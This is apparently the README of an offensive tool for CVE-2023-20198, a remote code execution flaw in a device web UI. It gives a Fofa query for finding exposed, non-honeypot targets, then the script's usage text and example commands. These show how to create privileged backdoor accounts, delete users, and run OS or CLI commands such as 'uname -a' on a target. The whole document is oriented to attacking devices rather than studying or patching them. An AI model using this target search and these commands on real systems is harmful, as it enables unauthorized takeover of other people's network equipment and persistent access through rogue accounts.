# Fofa

```
body="<script>window.onload=function(){ url ='/webui';window.location.href=url;}</script>" && is_honeypot=false && is_fraud=false
```

# Usage

```
usage: CVE-2023-20198-RCE.py [-h] -u URL [-p PROXY] [-au ADD_USER] [-ap ADD_PASS] [-du DEL_USER] [-pm PRIVILEGE_MODE]
                             [-em EXPLOIT_MODE] [-oc OS_CMD] [-cc CLI_CMD]

CVE-2023-20198-RCE

options:
  -h, --help            show this help message and exit
  -u URL, --url URL     target url to check, eg: http://example.com
  -p PROXY, --proxy PROXY
                        proxy url, eg: http://127.0.0.1:8083
  -au ADD_USER, --add-user ADD_USER
                        username to add.If left blank, an 8-digit mixed case English string will be randomly
                        generated.
  -ap ADD_PASS, --add-pass ADD_PASS
                        password to add.If left blank, an 8-digit mixed case English string will be randomly
                        generated.
  -du DEL_USER, --del-user DEL_USER
                        username to delete
  -pm PRIVILEGE_MODE, --privilege-mode PRIVILEGE_MODE
                        user/privileged
  -em EXPLOIT_MODE, --exploit-mode EXPLOIT_MODE
                        user/cmd
  -oc OS_CMD, --os-cmd OS_CMD
                        exec os command
  -cc CLI_CMD, --cli-cmd CLI_CMD
                        exec cli command
```

For example:

```powershell
python CVE-2023-20198-RCE.py -u http://192.168.1.198 -p http://127.0.0.1:8083 -em cmd -pm privileged -cc "show version" 

python CVE-2023-20198-RCE.py -u http://192.168.1.198 -p http://127.0.0.1:8083 -em cmd -oc "uname -a" 

python CVE-2023-20198-RCE.py -u http://192.168.1.198 -p http://127.0.0.1:8083 -em user -au -ap

python CVE-2023-20198-RCE.py -u http://192.168.1.198 -p http://127.0.0.1:8083 -em user -au hahahahha -ap hahahahha

python CVE-2023-20198-RCE.py -u http://192.168.1.198 -p http://127.0.0.1:8083 -em user -du aaaaaa

```

![](https://cdn.jsdelivr.net/gh/W01fh4cker/blog_image@main/image-20240425153133359.png)
